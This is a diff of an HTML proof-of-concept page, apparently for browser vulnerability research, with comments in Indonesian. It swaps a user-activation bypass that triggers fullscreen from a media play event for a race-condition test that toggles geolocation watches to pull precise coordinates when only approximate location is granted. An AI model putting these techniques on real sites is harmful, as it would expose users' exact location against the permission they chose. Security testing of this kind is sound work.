@@ -1,71 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Audio Focus Activation Test</title>
-</head>
+<head><meta charset="UTF-8"><title>Geo Precision Leak Test</title></head>
 <body>
-    <h3>User Activation Bypass Test</h3>
-    <p>Status: <span id="status">Menunggu pemutaran media...</span></p>
+<p>Status: <span id="status">Menunggu izin lokasi...</span></p>
+<pre id="output"></pre>
 
-    <!-- Media harus dapat diputar, pengguna perlu berinteraksi sekali atau autoplay diizinkan -->
-    <video id="triggerMedia" 
-           src="data:video/mp4;base64,..." 
-           playsinline 
-           muted 
-           style="width:200px;">
-    </video>
+<script>
+(async function() {
+    const statusEl = document.getElementById('status');
+    const outputEl = document.getElementById('output');
 
-    <script>
-    (function() {
-        const video = document.getElementById('triggerMedia');
-        const statusEl = document.getElementById('status');
-        let activationHarvested = false;
+    // Minta izin lokasi (pengguna harus memilih "Perkiraan/Approximate")
+    try {
+        const perm = await navigator.permissions.query({ name: 'geolocation' });
+        statusEl.textContent = `Status izin: ${perm.state}`;
+    } catch(e) {
+        statusEl.textContent = 'Kueri izin gagal: ' + e.message;
+        return;
+    }
 
-        // Kunci inti: dalam listener play, periksa dan gunakan aktivasi pengguna
-        video.addEventListener('play', function onPlay() {
-            // Beri sedikit delay agar token aktivasi tersinkronisasi ke proses browser
-            setTimeout(() => {
-                if (activationHarvested) return;
+    let leaked = false;
 
-                // Deteksi apakah ada token aktivasi sementara
-                const hasActivation = navigator.userActivation && 
-                                      navigator.userActivation.isActive;
+    // Inti: rapid toggle watchPosition/clearWatch, mengenai race condition jendela state
+    function rapidToggle() {
+        if (leaked) return;
+        const id = navigator.geolocation.watchPosition(
+            (pos) => {
+                const acc = pos.coords.accuracy;
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
 
-                statusEl.textContent = 
-                    `play terpicu, userActivation.isActive = ${hasActivation}`;
+                outputEl.textContent += 
+                    `lat=${lat.toFixed(6)}, lon=${lon.toFixed(6)}, accuracy=${acc.toFixed(1)}m\n`;
 
-                if (hasActivation) {
-                    // Coba panggil API yang memerlukan gesture pengguna
-                    const target = document.documentElement;
-                    if (target.requestFullscreen) {
-                        target.requestFullscreen()
-                            .then(() => {
-                                statusEl.textContent = 
-                                    "BERHASIL: requestFullscreen dipanggil!";
-                                activationHarvested = true;
-                            })
-                            .catch(err => {
-                                statusEl.textContent = 
-                                    `requestFullscreen gagal: ${err.message}`;
-                            });
-                    }
+                // Jika accuracy sangat kecil (misalnya < 100m), kemungkinan besar koordinat presisi
+                if (acc < 100 && !leaked) {
+                    leaked = true;
+                    statusEl.textContent = 'Kebocoran terdeteksi: menerima koordinat presisi (accuracy < 100m)';
                 }
-            }, 100);
-        });
+            },
+            (err) => { /* abaikan error, lanjutkan toggle */ },
+            { enableHighAccuracy: false, maximumAge: 0, timeout: 5000 }
+        );
 
-        // Untuk pengujian: mulai pemutaran melalui klik pengguna (simulasi kondisi awal)
-        document.body.addEventListener('click', function startOnce() {
-            video.play().catch(e => {
-                statusEl.textContent = `Gagal memutar: ${e.message}`;
-            });
-            document.body.removeEventListener('click', startOnce);
-        }, { once: true });
+        // Cepat bersihkan, lalu picu lagi
+        setTimeout(() => {
+            navigator.geolocation.clearWatch(id);
+            if (!leaked) setTimeout(rapidToggle, 10); // interval sangat pendek
+        }, 20);
+    }
 
-        // Petunjuk
-        statusEl.textContent = "Klik halaman untuk memulai pemutaran, lalu picu kehilangan fokus audio (misalnya terima SMS)";
-    })();
-    </script>
+    // Mulai setelah interaksi pengguna (beberapa browser memerlukan gesture)
+    document.body.addEventListener('click', function start() {
+        statusEl.textContent = 'Menguji... (pastikan perangkat memiliki izin lokasi presisi dan aplikasi lain sedang menggunakan lokasi)';
+        rapidToggle();
+        document.body.removeEventListener('click', start);
+    }, { once: true });
+
+    statusEl.textContent = 'Klik halaman untuk memulai pengujian';
+})();
+</script>
 </body>
 </html>
